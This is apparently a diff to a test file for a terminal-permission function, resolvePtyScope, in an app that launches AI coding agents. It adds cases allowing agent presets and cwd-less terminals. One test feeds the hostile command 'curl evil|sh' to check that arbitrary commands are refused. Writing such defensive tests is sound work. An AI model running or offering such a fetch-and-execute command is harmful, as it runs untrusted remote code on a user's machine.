@@ -100,15 +100,27 @@ describe('resolveFileScope', () => {
 })
 
 describe('resolvePtyScope', () => {
-  it('refuses arbitrary commands over the server bridge', () => {
+  it('refuses commands that are not agent/editor presets over the server bridge', () => {
     const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo', command: 'curl evil|sh' }, { allowCommands: false })
     expect(s).toMatchObject({ ok: false })
+  })
+  it('allows the agent presets without allowCommands (what the renderer emits)', () => {
+    for (const command of ['claude', 'codex', 'gemini', 'grok', 'claude --session-id n1', 'druk']) {
+      const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo', command }, { allowCommands: false })
+      expect(s).toEqual({ ok: true })
+    }
   })
   it('allows commands when explicitly permitted (desktop main)', () => {
     const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/home/me/demo', command: 'claude' }, { allowCommands: true })
     expect(s).toEqual({ ok: true })
   })
-  it('refuses unknown cwd', () => {
+  it('allows a cwd-less terminal (cwd-less projects start the shell in the workdir)', () => {
+    const s = resolvePtyScope(fakeStore([localProject]), {}, { allowCommands: false })
+    expect(s).toEqual({ ok: true })
+    const withCommand = resolvePtyScope(fakeStore([localProject]), { command: 'grok' }, { allowCommands: false })
+    expect(withCommand).toEqual({ ok: true })
+  })
+  it('refuses unknown explicit cwd', () => {
     const s = resolvePtyScope(fakeStore([localProject]), { cwd: '/tmp' }, { allowCommands: false })
     expect(s).toMatchObject({ ok: false })
   })
